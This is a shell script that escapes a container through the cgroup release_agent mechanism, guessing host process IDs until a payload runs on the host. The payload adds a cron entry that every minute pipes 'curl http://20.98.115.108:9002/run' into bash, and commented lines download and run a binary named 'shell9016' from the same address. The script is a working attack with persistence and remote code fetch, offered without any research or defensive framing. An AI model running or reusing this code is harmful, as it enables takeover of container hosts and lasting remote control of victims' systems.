#!/bin/sh
OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
echo " PAYLOAD PATH IS: $PAYLOAD_PATH"
# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &
# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
# Commands to run on the host<

#wget http://20.98.115.108:9002/shell9016 -O shell9016
#chmod +x ./shell9016 >> \${OUTPATH} 2>&1
#./shell9016 >> \${OUTPATH} 2>&1
crontab -l > mycron >> \${OUTPATH} 2>&1
echo "* * * * * curl http://20.98.115.108:9002/run | bash" >> mycron
crontab mycron >> \${OUTPATH} 2>&1
crontab -l >> \${OUTPATH} 2>&1
exit 0


__EOF__
# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}
# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done
# Wait for and cat the output
sleep 3
echo "output from script commands"
cat ${OUTPUT_PATH}
exit 0
